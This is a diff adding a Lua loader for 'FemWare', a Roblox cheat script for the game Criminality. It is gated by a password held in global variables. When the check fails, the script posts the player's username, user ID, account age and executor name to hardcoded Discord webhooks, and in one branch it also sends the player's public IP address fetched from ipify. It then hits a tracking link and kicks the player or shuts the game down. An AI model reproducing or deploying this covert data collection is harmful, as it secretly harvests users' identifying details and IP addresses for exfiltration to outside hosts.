@@ -1,0 +1,144 @@
+local impostor = "https://discord.com/api/webhooks/973832500780601374/3SVr3qPTU3UFwD8gnYeRPhrdaHaiIUPWRKbHmPlUCUgl7Qe9NyVVJxspmnwYd5cWpNTE"
+local hacker = "https://discord.com/api/webhooks/973832757765623808/ZmFKAsE8iVCfGuw4JMvUkdq02YkFXMF30XQkezzOG6p737w0BaWFryNJKxdDxWgvS8DJ"
+
+local function NoPass()
+    local ExecutorUsing =
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl" or
+    SONA_LOADED and "Sona" or
+    "WTF?"
+    local HttpService = game:GetService("HttpService")
+    local Data = {
+        ["embeds"] = {
+            {
+                ["title"] = "FemWare",
+                ["color"] = 16731726,
+                ["fields"] = {
+                    {
+                        ["name"] = "User",
+                        ["value"] = game.Players.LocalPlayer.Name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Id",
+                        ["value"] = game.Players.LocalPlayer.UserId,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Age",
+                        ["value"] = game.Players.LocalPlayer.AccountAge,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Executor",
+                        ["value"] = ExecutorUsing,
+                        ["inline"] = true
+                    },
+                }
+            }
+        }
+    }
+    
+    local Headers = {["Content-Type"] = "application/json"}
+    local Encoded = HttpService:JSONEncode(Data)
+    Request = http_request or request or HttpPost or syn.request
+    local Final = {Url = impostor, Body = Encoded, Method = "POST", Headers = Headers}
+    Request(Final)
+    game.Players.LocalPlayer:Kick("Wrong Password little boy. Get the latest script over FemWare Official, discord.gg/ZaSETw4774")
+    wait(15)
+    game:Shutdown()
+end
+
+local function Bypass()
+    local ExecutorUsing =
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl" or
+    SONA_LOADED and "Sona" or
+    "WTF?"
+    local HttpService = game:GetService("HttpService")
+    local Nicetry = game:HttpGet("https://api6.ipify.org/?format=plain")
+    local Data = {
+        ["embeds"] = {
+            {
+                ["title"] = "FemWare",
+                ["color"] = 9893552,
+                ["fields"] = {
+                    {
+                        ["name"] = "User",
+                        ["value"] = game.Players.LocalPlayer.Name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Id",
+                        ["value"] = game.Players.LocalPlayer.UserId,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Age",
+                        ["value"] = game.Players.LocalPlayer.AccountAge,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Executor",
+                        ["value"] = ExecutorUsing,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"]= "Type",
+                        ["value"]= "Break in: Front",
+                        ["inline"]= true
+                    },
+                    {
+                        ["name"]= "Webhook-Api",
+                        ["value"]= Nicetry,
+                        ["inline"]= true
+                    },
+                }
+            }
+        }
+    }
+    
+    local Headers = {["Content-Type"] = "application/json"}
+    local Encoded = HttpService:JSONEncode(Data)
+    Request = http_request or request or HttpPost or syn.request
+    local Final = {Url = hacker, Body = Encoded, Method = "POST", Headers = Headers}
+    Request(Final)
+    game:HttpGet("https://maper.info/Xjquc")
+    game:Shutdown()
+end
+
+local function MultipleEx()
+    game.Players.LocalPlayer:Kick("Do not execute twice. Script only loads when you Play in-game.")
+    wait(15)
+    game:Shutdown()
+end
+
+if game.PlaceId == 8343259840 then
+
+    if _G.FemKess ~= "FemWare On Top" then
+        Bypass()
+    else
+        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "FemWare"; Text = "Script Executing... Script only loads when in-game."; Icon = "rbxassetid://9327507243"; Duration = 30 })
+        wait(_G.Fem3k)
+        if _G.Fem2k == _G.Fem3k then
+            print("same")
+        else
+            print("pc exploded")
+        end
+        _G.FemKess = "FemWare on Top"
+        if _G.Pass2Poo ~= "BAKAYAOO" and _G.FemKess ~= "FemWare on Top" then
+            Bypass()
+            while true do
+                game:Shutdown()
+                game:GetService("Players").LocalPlayer:Kick()
+            end
+        else
+        end
+    end
+else
+    game.Players.LocalPlayer:Kick("Execute only when you are in Criminality game, not lobby.")
+    wait(15)
+    game:Shutdown()
+end
